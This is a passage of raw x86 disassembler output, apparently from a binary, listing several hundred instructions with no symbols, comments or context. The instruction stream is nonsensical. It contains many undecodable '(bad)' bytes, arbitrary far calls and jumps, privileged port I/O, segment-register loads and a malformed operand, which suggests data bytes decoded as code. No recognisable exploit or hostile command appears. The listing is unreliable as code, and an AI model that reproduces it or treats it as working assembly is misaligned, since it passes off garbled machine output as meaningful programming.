  49e669:	pop    eax
  49e66a:	add    BYTE PTR [edi],al
  49e66c:	addr16 push ebp
  49e66e:	add    bh,bh
  49e670:	push   edx
  49e671:	(bad)  
  49e673:	jne    0x49e6a9
  49e675:	jmp    DWORD PTR [esp+ecx*2+0x4a4a071f]
  49e67c:	jbe    0x49e6e1
  49e67e:	xlat   BYTE PTR ds:[ebx]
  49e67f:	mov    al,0xca
  49e681:	aam    0x0
  49e683:	call   FWORD PTR [esi+edi*4-0x3a]
  49e687:	ret    0xc8f6
  49e68a:	push   es
  49e68b:	mov    ds:0xcee64ecb,eax
  49e690:	enter  0x3ec3,0xde
  49e694:	inc    esi
  49e695:	jns    0x49e66f
  49e697:	cmp    ecx,0x778f8881
  49e69d:	ja     0x49e716
  49e69f:	xchg   esi,eax
  49e6a0:	add    DWORD PTR [eax],0x0
  49e6a3:	in     al,0xea
  49e6a5:	add    ch,dh
  49e6a7:	ins    BYTE PTR es:[edi],dx
  49e6a8:	ins    DWORD PTR es:[edi],dx
  49e6a9:	bound  edi,QWORD PTR [esi+0x2]
  49e6ac:	(bad)  
  49e6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e6ae:	(bad)  
  49e6af:	jg     0x49e668
  49e6b1:	mov    dh,0xb7
  49e6b3:	push   esp
  49e6b4:	ja     0x49e730
  49e6b6:	js     0x49e6af
  49e6b8:	push   0x72
  49e6ba:	ins    BYTE PTR es:[edi],dx
  49e6bb:	jmp    FWORD PTR [ebp+0x6b]
  49e6be:	imul   ebx,esi,0xffffff96
  49e6c1:	xchg   edi,eax
  49e6c2:	imul   bx,dx,0xffb7
  49e6c6:	in     al,0x64
  49e6c8:	call   FWORD PTR [esp+ebx*2+0x5d]
  49e6cc:	push   cs
  49e6cd:	fs addr16 add bh,bh
  49e6d1:	push   0xcd9973bb
  49e6d6:	jmp    FWORD PTR [ecx-0x1]
  49e6d9:	push   0xffffffde
  49e6db:	dec    esi
  49e6dc:	push   es
  49e6dd:	pop    ss
  49e6de:	cmp    eax,0x6aef7738
  49e6e3:	imul   esi,DWORD PTR es:[esi],0x60574e3f
  49e6ea:	call   0xc1f:0x9e0ace
  49e6f1:	ins    DWORD PTR es:[edi],dx
  49e6f2:	push   cs
  49e6f3:	ds (bad) 
  49e6f5:	pop    esp
  49e6f6:	xor    eax,0x2e3e8a99
  49e6fb:	data16 (bad) 
  49e6fd:	mov    ss,WORD PTR [esi]
  49e6ff:	add    al,0xb9
  49e701:	iret   
  49e702:	dec    DWORD PTR [edi]
  49e704:	push   ss
  49e705:	push   ss
  49e706:	(bad)  
  49e707:	rol    BYTE PTR [edi-0x39332f],0xbb
  49e70e:	mov    eax,0x898affb4
  49e713:	mov    esi,DWORD PTR [edi+0x2]
  49e716:	fstp   DWORD PTR [esi-0x7987d0b1]
  49e71c:	add    BYTE PTR [ebx+0x0],bl
  49e71f:	sbb    eax,0x58ffffdd
  49e724:	xchg   ebp,eax
  49e725:	lods   al,BYTE PTR ds:[esi]
  49e726:	or     BYTE PTR [esi+0x79],al
  49e729:	(bad)  
  49e72a:	push   esp
  49e72b:	push   ebx
  49e72c:	test   BYTE PTR [ecx+0x1c180da9],bl
  49e732:	cmp    ah,BYTE PTR [edi]
  49e734:	adc    DWORD PTR [eax+0x55],0xa6fc523d
  49e73b:	mov    ss,WORD PTR [eax-0x64636233]
  49e741:	sti    
  49e742:	mov    ch,0x80
  49e744:	inc    edi
  49e745:	scas   eax,DWORD PTR es:[edi]
  49e746:	inc    esp
  49e747:	aaa    
  49e748:	adc    eax,0x8687f61f
  49e74d:	xchg   DWORD PTR [esi+0x71717071],ebp
  49e753:	dec    edi
  49e754:	mul    al
  49e756:	mov    ds,edx
  49e758:	jns    0x49e718
  49e75a:	jns    0x49e7b2
  49e75c:	jp     0x49e765
  49e75e:	outs   dx,BYTE PTR ds:[esi]
  49e75f:	jnp    0x49e768
  49e761:	int3   
  49e762:	neg    cl
  49e764:	fldcw  WORD PTR [esi+ebp*8]
  49e767:	add    BYTE PTR [edi+0x70],al
  49e76a:	add    bh,bh
  49e76c:	jb     0x49e77d
  49e76e:	out    dx,al
  49e76f:	loope  0x49e737
  49e771:	inc    edi
  49e772:	data16 mov bh,0x86
  49e775:	out    0x89,eax
  49e777:	ss adc eax,0xae98549b
  49e77d:	mov    al,0xad
  49e77f:	push   cs
  49e780:	ret    
  49e781:	ror    edx,1
  49e783:	loopne 0x49e7fd
  49e785:	cmp    BYTE PTR [ebx],0x96
  49e788:	fcmovbe st,st(2)
  49e78a:	retf   
  49e78b:	sahf   
  49e78c:	push   ss
  49e78d:	fwait
  49e78e:	mov    al,ds:0xefb64af
  49e793:	cs jl  0x49e725
  49e796:	jge    0x49e798
  49e798:	pop    ebp
  49e799:	add    BYTE PTR [ebx-0x46],dh
  49e79c:	jg     0x49e776
  49e79e:	(bad)  
  49e79f:	call   edi
  49e7a1:	add    ah,BYTE PTR [edx-0x5d]
  49e7a4:	mov    ebx,0xd0b56f4b
  49e7a9:	imul   DWORD PTR [ebp-0x54]
  49e7ac:	ret    
  49e7ad:	jmp    0x49e7c1
  49e7af:	push   ds
  49e7b0:	and    al,0x61
  49e7b2:	aaa    
  49e7b3:	les    edi,FWORD PTR [ebp-0x6562fd41]
  49e7b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49e7ba:	push   ecx
  49e7bb:	ret    
  49e7bc:	call   FWORD PTR [edx-0x6e6d6b8a]
  49e7c2:	loop   0x49e766
  49e7c4:	lahf   
  49e7c5:	popf   
  49e7c6:	std    
  49e7c7:	dec    esp
  49e7c8:	mov    dh,0x5e
  49e7ca:	test   BYTE PTR [ebp-0x5],0x4e
  49e7ce:	loop   0x49e77c
  49e7d0:	stos   BYTE PTR es:[edi],al
  49e7d1:	test   eax,0x85ff8e00
  49e7d6:	xchg   BYTE PTR [ebp+0x48888506],al
  49e7dc:	jae    0x49e7f6
  49e7de:	scas   al,BYTE PTR es:[edi]
  49e7df:	mov    dh,ah
  49e7e1:	add    al,0x7
  49e7e3:	pushf  
  49e7e4:	mov    esi,0x7eee20f7
  49e7e9:	mov    ch,BYTE PTR [esi]
  49e7eb:	mov    BYTE PTR [edi],bh
  49e7ed:	and    BYTE PTR [esi-0x1f],0x84
  49e7f1:	add    edx,DWORD PTR [esi+ebp*8]
  49e7f4:	xchg   BYTE PTR [edi],dh
  49e7f6:	out    dx,al
  49e7f7:	shl    eax,0xe1
  49e7fa:	ficom  WORD PTR [esi-0x1c9f8d1]
  49e800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49e801:	call   0xa776:0x7e406d76
  49e808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49e809:	jbe    0x49e7d0
  49e80b:	rol    esi,0xcf
  49e80e:	in     eax,dx
  49e80f:	push   ss
  49e810:	mov    ebp,0xd1d7860f
  49e815:	enter  0xca06,0xf6
  49e819:	scas   eax,DWORD PTR es:[edi]
  49e81a:	lods   al,BYTE PTR ds:[esi]
  49e81b:	outs   dx,BYTE PTR ds:[esi]
  49e81c:	mov    ?,WORD PTR [ebx-0x1]
  49e81f:	syscall 
  49e821:	push   ebp
  49e822:	cmp    BYTE PTR [ebx+0x7f],ah
  49e825:	jns    0x49e7e9
  49e827:	loope  0x49e82f
  49e829:	ja     0x49e7eb
  49e82b:	fst    QWORD PTR [esi+0x7a]
  49e82e:	(bad)
  49e831:	adc    ebx,DWORD PTR [ebx-0x317f0601]
  49e837:	in     al,dx
  49e838:	jmp    DWORD PTR [ebp+ebx*4-0x4b]
  49e83c:	out    0x22,al
  49e83e:	jne    0x49e866
  49e840:	add    eax,0xf60b0807
  49e845:	rcr    DWORD PTR es:[edi+0x12aeaea7],0xa0
  49e84d:	jle    0x49e809
  49e84f:	xchg   ebp,eax
  49e850:	xchg   esp,eax
  49e851:	icebp  
  49e852:	test   eax,0x29fdbfc8
  49e857:	add    al,0x86
  49e859:	loopne 0x49e829
  49e85b:	mov    ebp,0xb6b0b1ff
  49e860:	call   0x5e94:0x94ff9a9b
  49e867:	pop    ss
  49e868:	pop    esp
  49e869:	scas   al,BYTE PTR es:[edi]
  49e86a:	xchg   ebp,eax
  49e86b:	push   esi
  49e86c:	pop    eax
  49e86d:	push   ds
  49e86e:	call   0x19dd:0x1f4e9b1e
  49e875:	outs   dx,BYTE PTR ds:[esi]
  49e876:	push   es
  49e877:	pop    ss
  49e878:	xchg   esi,eax
  49e879:	out    dx,al
  49e87a:	xchg   ecx,eax
  49e87b:	jbe    0x49e8a0
  49e87d:	mov    esp,0x9cb7bd60
  49e882:	add    BYTE PTR [esi+0x66],bl
  49e885:	js     0x49e872
  49e887:	sahf   
  49e888:	jge    0x49e891
  49e88a:	xchg   ebx,eax
  49e88b:	add    BYTE PTR [edi],ch
  49e88d:	pop    es
  49e88e:	xchg   ecx,eax
  49e88f:	add    bh,bh
  49e891:	mov    WORD PTR [ebp+0x386bda8e],cs
  49e897:	cmp    ebp,DWORD PTR [esi+0x4e8e4688]
  49e89d:	mov    bl,0xc6
  49e89f:	mov    ecx,0xd860c2ce
  49e8a4:	hlt    
  49e8a5:	outs   dx,DWORD PTR ds:[esi]
  49e8a6:	in     al,0xdb
  49e8a8:	sar    edx,cl
  49e8aa:	into   
  49e8ab:	mov    cl,0xe8
  49e8ae:	push   esi
  49e8af:	popf   
  49e8b0:	dec    ebx
  49e8b1:	out    dx,eax
  49e8b2:	pop    edi
  49e8b3:	hlt    
  49e8b4:	(bad)  
  49e8b5:	(bad)  
  49e8b6:	mov    ecx,0xc3790ad9
  49e8bb:	loope  0x49e91f
  49e8bd:	js     0x49e880
  49e8bf:	fdivp  st(0),st
  49e8c1:	jp     0x49e887
  49e8c3:	loopne 0x49e8c4
  49e8c5:	jg     0x49e892
  49e8c7:	out    0x2e,eax
  49e8c9:	mov    ds:0x2417e6b9,al
  49e8ce:	outs   dx,DWORD PTR ds:[esi]
  49e8cf:	(bad)  
  49e8d0:	inc    ecx
  49e8d2:	sub    BYTE PTR [ebp-0x4a],dh
  49e8d5:	sbb    eax,0x301b170e
  49e8da:	push   eax
  49e8db:	jge    0x49e86d
  49e8dd:	xor    al,0x89
  49e8df:	aam    0xf5
  49e8e1:	inc    esi
  49e8e2:	test   BYTE PTR [edi-0x7f],ch
  49e8e5:	(bad)  
  49e8e6:	in     al,0x2b
  49e8e8:	ss add eax,0xc58fbdff
  49e8ee:	(bad)  
  49e8f0:	cwde   
  49e8f1:	lods   eax,DWORD PTR ds:[esi]
  49e8f2:	mov    ch,0x36
  49e8f4:	call   0x80c6:0xcb06adb2
  49e8fb:	push   ebp
  49e8fc:	pop    es
  49e8fd:	inc    ebp
  49e8fe:	lds    dx,DWORD PTR [esi-0x54001f4b]
  49e905:	int    0x29
  49e907:	mov    al,0x7d
  49e909:	into   
  49e90a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49e90c:	test   al,0x6
  49e90e:	test   eax,0x160776a9
  49e913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49e914:	mov    bl,0x75
  49e916:	iret   
  49e917:	ins    BYTE PTR es:[edi],dx
  49e918:	add    bh,bh
  49e91a:	mov    al,ds:0xa31f0f
  49e91f:	jmp    DWORD PTR [ecx+0x6608c1c1]
  49e925:	call   FWORD PTR [edi-0x103830b2]
  49e92b:	loop   0x49e960
  49e92d:	fild   DWORD PTR [eax]
  49e92f:	dec    DWORD PTR [edi-0x568173f9]
  49e935:	xchg   BYTE PTR [esi-0x7e320010],ch
  49e93b:	lods   al,BYTE PTR ds:[esi]
  49e93c:	xchg   esi,eax
  49e93d:	sbb    ch,ch
  49e93f:	mov    dl,0xb2
  49e941:	stos   DWORD PTR es:[edi],eax
  49e942:	jbe    0x49e939
  49e944:	jmp    0xce1f2828
  49e949:	lds    eax,FWORD PTR [edi]
  49e94b:	xor    al,0x9b
  49e94d:	out    0x43,eax
  49e94f:	jg     0x49e9bc
  49e951:	mov    al,0xcc
  49e953:	movq   mm4,mm2
  49e956:	jmp    eax
  49e958:	jmp    FWORD PTR [edi]
  49e95a:	push   0xe3c3be76
  49e95f:	enter  0x6d7e,0xaa
  49e963:	shl    eax,0x32
  49e966:	dec    edx
  49e967:	push   esp
  49e968:	mov    al,0x20
  49e96a:	ss aas 
  49e96c:	lea    edi,[ecx-0x53]
  49e96f:	loop   0x49e970
  49e971:	cmp    esp,DWORD PTR [ebp+esi*2-0x3f]
  49e975:	popa   
  49e976:	sahf   
  49e977:	mov    bh,0xf1
  49e979:	or     al,0xe6
  49e97c:	dec    cl
  49e97e:	ss jg  0x49e98f
  49e981:	jg     0x49e91c
  49e983:	or     al,0xab
  49e985:	ds (bad) 
  49e987:	ret    0xa6d8
  49e98a:	stos   DWORD PTR es:[edi],eax
  49e98b:	mov    dl,0xd6
  49e98d:	cmp    BYTE PTR [eax],bh
  49e98f:	cmp    eax,0xc0d630ad
  49e994:	call   eax
  49e996:	out    dx,al
  49e997:	retf   
  49e998:	(bad)  
  49e999:	mov    eax,0x24a80df0
  49e99e:	mov    edx,0xb9ffbbc6
  49e9a3:	mov    ecx,0x85d66eba
  49e9a8:	add    esi,DWORD PTR [esi+edi*2]
  49e9ab:	mov    ah,0xee
  49e9ad:	mov    al,0x26
  49e9af:	mov    dl,0x0
  49e9b1:	je     0x49e994
  49e9b3:	rcl    DWORD PTR [edx],0x66
  49e9b6:	jg     0x49e957
  49e9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49e9b9:	fwait
  49e9ba:	sti    
  49e9bb:	sub    cl,BYTE PTR [esi]
  49e9bd:	sbb    dh,bh
  49e9bf:	push   esi
  49e9c0:	pushf  
  49e9c1:	xchg   esp,eax
  49e9c2:	pop    ds
  49e9c3:	stos   DWORD PTR es:[edi],eax
  49e9c4:	ss sub al,0xfa
  49e9c7:	sub    bl,al
  49e9c9:	mov    ebx,0xffd16600
  49e9ce:	(bad)  
  49e9d0:	fdivp  st(6),st
  49e9d2:	fcmovnu st,st(4)
  49e9d4:	push   ecx
  49e9d5:	sub    BYTE PTR [edi+0x26],0x1e
  49e9d9:	jle    0x49ea47
  49e9db:	outs   dx,BYTE PTR ds:[esi]
  49e9dc:	jo     0x49e9d0
  49e9de:	aaa    
  49e9df:	pop    eax
  49e9e0:	push   eax
  49e9e1:	fwait
  49e9e2:	int3   
  49e9e3:	adc    eax,0x6f
  49e9e6:	jle    0x49e985
  49e9e8:	jb     0x49ea20
  49e9ea:	(bad)  
  49e9eb:	in     al,0xb
  49e9ed:	call   0xc4fe:0x86ff831d
  49e9f4:	in     al,0xc7
  49e9f6:	outs   dx,BYTE PTR cs:[esi]
  49e9f8:	scas   eax,DWORD PTR es:[edi]
  49e9f9:	popa   
  49e9fa:	ret    
  49e9fb:	mov    bl,BYTE PTR ds:0x9e7b42de
  49ea01:	dec    eax
  49ea02:	xchg   BYTE PTR [esi],dh
  49ea04:	push   eax
  49ea05:	nop
  49ea06:	pop    esp
  49ea07:	jnp    0x49e9d9
  49ea09:	mov    ah,0x6
  49ea0b:	bound  esp,QWORD PTR [esi+eax*4+0x7e87f7f]
  49ea12:	out    0xd0,eax
  49ea14:	ins    BYTE PTR es:[edi],dx
  49ea15:	push   ss
  49ea16:	mov    esp,0x888ec981
  49ea1b:	rcl    DWORD PTR [edi-0x3ed06156],0x85
  49ea22:	dec    ebx
  49ea23:	or     BYTE PTR [esi-0x79772b1a],al
  49ea29:	cmp    DWORD PTR [edi+0x2fc2846d],0xffffffb4
  49ea30:	mov    ah,0x1e
  49ea32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ea33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ea34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49ea35:	cld    
  49ea36:	sahf   
  49ea37:	popf   
  49ea38:	sahf   
  49ea39:	dec    edi
  49ea3a:	stos   DWORD PTR es:[edi],eax
  49ea3b:	js     0x49ea42
  49ea3d:	and    DWORD PTR [edi+0x3e],0xffffffbd
  49ea41:	mov    esp,0x3600d15e
  49ea46:	fwait
  49ea47:	int    0x66
  49ea49:	jmp    esi
  49ea4b:	push   edi
  49ea4d:	(bad)  
  49ea4e:	stc    
  49ea4f:	(bad)  
  49ea50:	sti    
  49ea51:	(bad)  
  49ea52:	cli    
  49ea53:	xor    ebx,DWORD PTR [ebx-0x7009321]
  49ea59:	push   ebp
  49ea5b:	cmc    
  49ea5c:	idiv   bh
  49ea5e:	jecxz  0x49ea5f
  49ea60:	int    0x6e
  49ea62:	(bad)  
  49ea63:	push   eax
  49ea64:	lock movzx esi,BYTE PTR [esp+eax*2]
  49ea69:	inc    ebp
  49ea6a:	mov    eax,ds:0xd0b26c7f
  49ea6f:	push   DWORD PTR [ebx-0x45]
  49ea72:	sub    BYTE PTR [edi+0x7df6dd75],0xc7
  49ea79:	in     eax,0x1e
  49ea7b:	lds    edx,FWORD PTR [esi+0x7b]
  49ea7e:	push   cs
  49ea7f:	jg     0x49ea4b
  49ea81:	es mov dh,0x6d
  49ea84:	push   ss
  49ea85:	std    
  49ea86:	outs   dx,DWORD PTR ds:[esi]
  49ea87:	mov    dl,0xcc
  49ea89:	(bad)  
  49ea8a:	ds jbe 0x49ea9b
  49ea8d:	cmp    al,0x72
  49ea8f:	inc    esi
  49ea90:	jl     0x49ea78
  49ea92:	popa   
  49ea93:	mov    al,ds:0xcf281cd6
  49ea98:	out    dx,eax
  49ea99:	or     edx,0xc98007e9
  49ea9f:	retf   0xca8e
  49eaa2:	fdiv   DWORD PTR [ebp+0x683937d]
  49eaa8:	jnp    0x49ea67
  49eaaa:	xchg   esi,eax
  49eaab:	xchg   ebx,eax
  49eaac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49eaad:	jle    0x49ea53
  49eaaf:	mov    ds:0x26ffd37f,al
  49eab4:	push   esi
  49eab5:	add    al,0x9a
  49eab7:	(bad)  
  49eab8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49eab9:	mov    ds:0xa1a5dd9d,al
  49eabe:	popf   
  49eabf:	test   al,0x64
  49eac1:	popf   
  49eac2:	je     0x49ea77
  49eac4:	mov    ch,0xb5
  49eac6:	shl    DWORD PTR [edi+0x1f607b48],1
  49eacc:	jbe    0x49ea9e
  49eace:	add    BYTE PTR [edi-0x2],al
  49ead1:	add    bh,bh
  49ead3:	int    0x96
  49ead5:	add    dh,BYTE PTR [ebx]
  49ead7:	std    
  49ead8:	outs   dx,DWORD PTR ds:[esi]
  49ead9:	add    bh,bh
  49eadb:	icebp  
  49eadc:	(bad)  
  49eadd:	push   DWORD PTR [eax-0x4]
  49eae0:	cdq    
  49eae1:	lock pop es
  49eae3:	(bad)  
  49eae4:	aad    0xd5
  49eae6:	out    dx,al
  49eae7:	(bad)  
  49eae8:	push   esp
  49eae9:	pop    ebx
  49eaea:	pop    ebx
  49eaeb:	int    0x83
  49eaed:	stc    
  49eaee:	inc    eax
  49eaef:	lock and eax,0x7f1b3d3d
  49eaf5:	outs   dx,BYTE PTR ds:[esi]
  49eaf6:	mov    ah,0xd1
  49eaf8:	cmc    
  49eaf9:	inc    BYTE PTR [edx+0x7e43029b]
  49eaff:	sahf   
  49eb00:	jbe    0x49eac8
  49eb02:	jl     0x49eacb
  49eb04:	out    0x36,eax
  49eb06:	ret    
  49eb07:	pop    ebp
  49eb08:	call   FWORD PTR [ebx-0x304b8e35]
  49eb0e:	inc    DWORD PTR [eax+0x76]
  49eb11:	(bad)  
  49eb12:	(bad)  
  49eb13:	cmp    eax,0x7f487672
  49eb18:	xchg   esi,eax
  49eb19:	(bad)  
  49eb1a:	lock fisttp QWORD PTR ds:0xea2ebdde
  49eb21:	jle    0x49eb29
  49eb23:	ds pop es
  49eb25:	retf   0x6c56
  49eb28:	fild   WORD PTR [edi+ecx*4-0x7e]
  49eb2c:	push   es
  49eb2d:	jae    0x49eaf5
  49eb2f:	push   ds
  49eb30:	mov    esi,eax
  49eb32:	mov    gs,eax
  49eb34:	stc    
  49eb35:	rol    DWORD PTR [edi-0x6bf1f403],0xae
  49eb3c:	mov    ah,0xeb
  49eb3e:	imul   ecx,DWORD PTR [esi-0x3728df64],0x8c65cbc9
  49eb48:	xor    BYTE PTR [ebx+0x2b],bl
  49eb4b:	inc    eax
  49eb4c:	sahf   
  49eb4d:	jbe    0x49eb0c
  49eb4f:	xchg   esi,eax
  49eb50:	test   BYTE PTR [eax],0xff
  49eb53:	cld    
  49eb54:	mov    WORD PTR ds:0xedf7bbc,ss
  49eb5a:	pop    es
  49eb5b:	jg     0x49ebcf
  49eb5d:	fadd   DWORD PTR [ebx]
  49eb5f:	jmp    0x49eb30
  49eb61:	out    dx,eax
  49eb62:	add    BYTE PTR [edi-0x7e79ff15],cl
  49eb68:	loope  0x49eba9
  49eb6a:	and    BYTE PTR [eax],cl
  49eb6c:	sahf   
  49eb6d:	(bad)  
  49eb6e:	das    
  49eb6f:	inc    esp
  49eb70:	inc    esp
  49eb71:	push   ebx
  49eb72:	call   FWORD PTR [edx]
  49eb74:	mov    esp,0xb771f9f6
  49eb79:	aam    0xf5
  49eb7b:	jb     0x49ebfc
  49eb7d:	int    0x46
  49eb7f:	jl     0x49eb7f
  49eb81:	jge    0x49ebc2
  49eb83:	into   
  49eb84:	or     ebp,DWORD PTR [edx]
  49eb86:	outs   dx,BYTE PTR ds:[esi]
  49eb87:	fcom   DWORD PTR [esi]
  49eb89:	jb     0x49eb41
  49eb8b:	inc    esi
  49eb8c:	inc    ebx
  49eb8d:	jp     0x49eb1f
  49eb8f:	push   es
  49eb90:	jne    0x49ec10
  49eb92:	dec    ecx
  49eb93:	xor    dl,0x6e
  49eb96:	call   0x2e7e:0x63ff97e3
  49eb9d:	int3   
  49eb9e:	or     ah,0xea
  49eba1:	push   es
  49eba2:	jmp    0x49ebab
  49eba4:	int    0xc8
  49eba6:	in     eax,0x81
  49eba8:	jmp    0xdfc2:0x769683cb
  49ebaf:	cmc    
  49ebb0:	mov    bh,0xc7
  49ebb2:	push   es
  49ebb3:	mov    bl,cl
  49ebb5:	call   0x75ccefc8
  49ebba:	xchg   BYTE PTR [edi-0x5c950d38],dh
  49ebc0:	mov    eax,0xab886022
  49ebc5:	test   eax,0xef86209f
  49ebca:	es cwde 
  49ebcc:	into   
  49ebcd:	loopne 0x49eb70
  49ebcf:	and    al,0xec
  49ebd1:	out    dx,eax
  49ebd2:	outs   dx,DWORD PTR ds:[esi]
  49ebd3:	add    esi,edi
  49ebd5:	fld    DWORD PTR [ebx-0xf8a3cb]
  49ebdb:	jg     0x49ebcb
  49ebdd:	add    BYTE PTR [edi],dh
  49ebdf:	cdq    
  49ebe0:	icebp  
  49ebe1:	test   DWORD PTR [esi],edx
  49ebe3:	push   es
  49ebe4:	out    0xe5,eax
  49ebe6:	in     eax,0xee
  49ebe8:	push   cs
  49ebe9:	push   ecx
  49ebea:	pop    esp
  49ebeb:	pop    esp
  49ebec:	das    
  49ebed:	clc    
  49ebee:	pop    es
  49ebef:	stc    
  49ebf0:	test   al,0x2d
  49ebf2:	inc    edx
  49ebf3:	inc    edx
  49ebf4:	or     esi,DWORD PTR [edx+edi*4-0x28]
  49ebf8:	cmc    
  49ebf9:	jbe    0x49ebba
  49ebfb:	fstp   QWORD PTR [esi]
  49ebfd:	shr    dh,1
  49ebff:	(bad)  
  49ec00:	jg     0x49ebfa
  49ec02:	inc    cx
  49ec04:	cmp    eax,DWORD PTR [esi]
  49ec06:	in     eax,dx
  49ec07:	push   cs
  49ec08:	iret   
  49ec09:	out    dx,al
  49ec0a:	mov    bh,0xd3
  49ec0c:	inc    DWORD PTR [ebp+0x7c]
  49ec0f:	mov    ch,0x8b
  49ec11:	or     ch,dh
  49ec13:	out    0x3f,al
  49ec15:	ja     0x49eba3
  49ec17:	jle    0x49eb9c
  49ec19:	pop    esi
  49ec1a:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  49ec1c:	ret    0xcd2e
  49ec1f:	and    dl,BYTE PTR [ebp-0x32c91f2a]
  49ec25:	ja     0x49ec13
  49ec27:	push   es
  49ec28:	int    0xeb
  49ec2a:	mov    eax,ds:0x970b9e3d
  49ec2f:	cmp    DWORD PTR [ecx-0x4a],0xe
  49ec33:	out    dx,eax
  49ec34:	pop    edi
  49ec35:	add    ecx,edi
  49ec37:	mov    edi,0xfffff75e
  49ec3c:	jnp    0x49ebf7
  49ec3e:	into   
  49ec3f:	cmc    
  49ec40:	push   0xe623c1a7
  49ec45:	mov    bl,0x6d
  49ec47:	and    eax,0xffffffa7
  49ec4a:	xchg   esp,eax
  49ec4b:	push   es
  49ec4c:	loopne 0x49ec2e
  49ec4e:	loope  0x49eccf
  49ec50:	pop    ss
  49ec51:	ret    
  49ec52:	mov    es,ecx
  49ec54:	ds pop es
  49ec56:	hlt    
  49ec57:	add    bh,bh
  49ec59:	in     al,dx
  49ec5a:	add    ah,bh
  49ec5c:	ucomiss xmm3,DWORD PTR [edx+0x7]
  49ec60:	cmc    
  49ec61:	pop    esi
  49ec62:	hlt    
  49ec63:	xchg   esi,eax
  49ec64:	lea    ecx,[esp+ecx*4+0x505044f2]
  49ec6b:	sub    eax,0x4a1ebdc1
  49ec70:	push   edi
  49ec71:	mov    ebp,0x82eff5db
  49ec76:	shl    ecx,1
  49ec78:	jbe    0x49ec91
  49ec7a:	fdiv   QWORD PTR [esi-0x317f32b3]
  49ec80:	test   dx,dx
  49ec83:	push   ss
  49ec84:	ja     0x49ec40
  49ec86:	aad    0x7e
  49ec88:	jge    0x49ec1e
  49ec8a:	push   DWORD PTR [esi+0x42fcaff9]
  49ec90:	js     0x49ec20
  49ec92:	dec    DWORD PTR [ebx-0x7c]
  49ec95:	sar    edi,0x84
  49ec98:	into   
  49ec99:	out    dx,al
  49ec9a:	inc    DWORD PTR [edx-0x12301232]
  49eca0:	pavgb  mm1,QWORD PTR [ecx+eax*8+0x41]
  49eca5:	xchg   DWORD PTR [edi-0x2e3d407c],edx
  49ecab:	scas   al,BYTE PTR es:[edi]
  49ecac:	jle    0x49ec98
  49ecae:	push   cs
  49ecaf:	dec    esi
  49ecb0:	les    edx,FWORD PTR [esi+edx*4]
  49ecb3:	mov    eax,0xa468f1cc
  49ecb8:	mov    esi,0xdb3366c
  49ecbd:	inc    DWORD PTR [ecx]
  49ecbf:	mov    DWORD PTR [ecx],edi
  49ecc1:	pushf  
  49ecc2:	in     eax,dx
  49ecc3:	in     al,dx
  49ecc4:	icebp  
  49ecc5:	push   cs
  49ecc6:	out    dx,al
  49ecc7:	ret    
  49ecc8:	pop    edi
  49ecc9:	pop    es
  49ecca:	out    dx,al
  49eccb:	pop    es
  49eccc:	push   cs
  49eccd:	inc    edi
  49ecce:	imul   dl
  49ecd0:	xchg   esi,eax
  49ecd1:	(bad)  
  49ecd2:	repz add bh,ch
  49ecd5:	test   BYTE PTR [edi],0x78
  49ecd8:	fistp  QWORD PTR [edi]
  49ecda:	ja     0x49ecc6
  49ecdc:	jmp    0x1f38fcca
  49ece1:	mov    bh,0x7e
  49ece3:	inc    esi
  49ece4:	imul   ebx,DWORD PTR [edx+0x5151e087],0xbf767f56
  49ecee:	ffreep st(3)
  49ecf0:	cmp    DWORD PTR [eax+eiz*8+0x3e80e0f6],0xffffff81
  49ecf8:	iret   
  49ecf9:	push   cs
  49ecfa:	xchg   esp,edx
  49ecfc:	repz jle 0x49ecbb
  49ecff:	(bad)  
  49ed00:	inc    DWORD PTR [ebx+ecx*1-0x12]
  49ed04:	cli    
  49ed05:	inc    DWORD PTR [ebx+edi*2-0x6f]
  49ed09:	dec    DWORD PTR [esp+eax*4-0x64]
  49ed0d:	call   FWORD PTR [edx-0x68]
  49ed10:	xchg   BYTE PTR [eax-0x3e],bh
  49ed13:	fidiv  WORD PTR [esi]
  49ed15:	shr    edi,1
  49ed17:	loopne 0x49ecd2
  49ed19:	mov    ebx,0x47f00678
  49ed1e:	pop    es
  49ed1f:	or     dh,0xef
  49ed22:	out    dx,al
  49ed23:	arpl   WORD PTR [ebx+0x71],bp
  49ed26:	lock xchg DWORD PTR [esi+eiz*4+0x1ecc377d],eax
  49ed2e:	scas   al,BYTE PTR es:[edi]
  49ed2f:	cmc    
  49ed30:	push   ebx
  49ed31:	daa    
  49ed32:	(bad)  
  49ed33:	sub    ch,BYTE PTR [edx-0x53]
  49ed36:	ret    0x5de6
  49ed39:	cdq    
  49ed3a:	mov    al,0x1f
  49ed3c:	das    
  49ed3d:	mov    al,ds:0x63e3c3d
  49ed42:	dec    esi
  49ed43:	dec    edi
  49ed44:	pop    esi
  49ed45:	out    0xb0,eax
  49ed47:	pop    ds
  49ed48:	sbb    ebx,esi
  49ed4a:	push   es
  49ed4b:	pop    ss
  49ed4c:	idiv   DWORD PTR [edi-0x13]
  49ed4f:	add    BYTE PTR [ebx],al
  49ed51:	cwde   
  49ed52:	enter  0x6f38,0xc6
  49ed56:	push   es
  49ed57:	inc    esi
  49ed58:	loopne 0x49ed39
  49ed5a:	mov    WORD PTR [esi],es
  49ed5c:	lahf   
  49ed5d:	xlat   BYTE PTR ds:[ebx]
  49ed5e:	push   ss
  49ed5f:	imul   bp,WORD PTR [ebx-0x3a],0x3d
  49ed64:	dec    edx
  49ed65:	dec    edx
  49ed66:	or     eax,0xdcf6c7dd
  49ed6b:	jg     0x49ede5
  49ed6d:	shl    al,0xe1
  49ed70:	not    dl
  49ed72:	hlt    
  49ed73:	xchg   cl,dh
  49ed75:	push   es
  49ed76:	cwde   
  49ed77:	scas   al,BYTE PTR es:[edi]
